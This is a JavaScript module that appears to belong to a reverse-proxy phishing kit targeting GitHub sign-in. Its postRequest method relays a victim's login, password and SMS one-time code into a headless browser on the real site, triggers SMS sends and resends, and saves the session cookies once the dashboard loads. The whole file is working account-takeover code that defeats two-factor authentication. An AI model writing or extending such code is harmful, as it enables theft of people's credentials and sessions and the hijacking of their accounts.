const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                const username = `#login_field`

                await page.waitForSelector(username)
                await page.evaluate(() => {
                    document.getElementById("login_field").value = ""
                    document.getElementById("login_field").setAttribute("value", "")
                })

                await page.type(username, this.email)
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            ["Top Repositories", 'Dashboard', "Home"]
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-login") {
                const username = `#login_field`
                const password = `#password`

                await page.waitForSelector(username)
                await page.waitForSelector(password)
                await page.evaluate(() => {
                    document.getElementById("login_field").value = ""
                    document.getElementById("password").value = ""
                    document.getElementById("login_field").setAttribute("value", "")
                    document.getElementById("password").setAttribute("value", "")
                })

                await page.type(username, body.login)
                await page.type(password, body.password)
                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "sms-code") {
                const otpInp = `#sms_totp`

                await page.waitForSelector(otpInp)
                await page.type(otpInp, body.sms_otp)
                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "send-sms") {
                await page.waitForSelector(`[type="submit"]`)
                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            } else if (spikeType == "resend-code") {
                await page.evaluate(() => {
                    document.querySelectorAll("button").forEach(btn => {
                        if (btn.type == "submit" && btn.innerText.includes("Resend SMS")) {
                            btn.click()
                        }
                    })
                })

                await new Promise(re => setTimeout(re, 3000))
            } else if (spikeType == "captcha") {
                await page.click(`[type="submit"]`)
                await page.waitForNavigation({ waitUntil: "networkidle0" })
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }